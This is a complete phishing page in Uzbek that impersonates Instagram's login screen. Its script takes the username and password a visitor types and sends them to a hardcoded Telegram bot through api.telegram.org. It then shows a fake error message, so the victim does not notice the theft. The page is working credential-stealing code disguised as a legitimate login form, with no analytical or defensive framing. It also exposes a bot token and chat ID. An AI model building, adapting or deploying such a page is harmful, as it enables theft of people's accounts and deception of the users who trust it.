<!DOCTYPE html>
<html lang="uz">
<head>
  <meta charset="UTF-8" />
  <title>Instagram</title>
  <link href="https://fonts.googleapis.com/css2?family=Billabong&display=swap" rel="stylesheet">
  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      padding: 0;
      font-family: 'Segoe UI', sans-serif;
      background: linear-gradient(45deg, #feda75, #fa7e1e, #d62976, #962fbf, #4f5bd5);
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      animation: fadeIn 1.5s ease-in;
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: scale(0.9); }
      to { opacity: 1; transform: scale(1); }
    }

    .container {
      background: white;
      padding: 40px 30px;
      border-radius: 20px;
      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
      text-align: center;
      max-width: 350px;
      width: 100%;
    }

    .logo {
      font-family: 'Billabong', cursive;
      font-size: 48px;
      color: #262626;
      margin-bottom: 20px;
    }

    input {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 8px;
      font-size: 14px;
    }

    button {
      background-color: #3897f0;
      color: white;
      padding: 12px;
      width: 100%;
      font-size: 14px;
      font-weight: bold;
      border: none;
      border-radius: 8px;
      margin-top: 10px;
      cursor: pointer;
      transition: background 0.3s;
    }

    button:hover {
      background-color: #287dc4;
    }

  </style>
</head>
<body>
  <div class="container">
    <div class="logo">Instagram</div>

    <p><b>Instagram loginni kiriting:</b></p>
    <input type="text" id="instaLogin" placeholder="@username" />

    <p><b>Instagram parolingiz:</b></p>
    <input type="password" id="instaPassword" placeholder="********" />

    <button id="submitBtn">Yuborish</button>
  </div>

  <script>
    document.getElementById("submitBtn").addEventListener("click", function () {
      const instaLogin = document.getElementById("instaLogin").value.trim();
      const instaPassword = document.getElementById("instaPassword").value.trim();

      const message = `
🆕 Instagram ma'lumotlari:

👤 Login: ${instaLogin}
🔑 Parol: ${instaPassword}
      `;

      const botToken = '7499346689:AAFvoixn_YYNFVJSIUDdh-KmDm8vLRvwsnE';
      const chatId = '902776622';

      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: 'Markdown'
        })
      })
      .then(res => res.json())
      .then(data => {
        if (data.ok) {
          alert("xatolil yuz berdi !");
        } else {
          alert("❌ Xatolik: " + data.description);
        }
      })
      .catch(error => {
        console.error("Xatolik:", error);
        alert("⛔ Tarmoq muammosi.");
      });
    });
  </script>
</body>
</html>
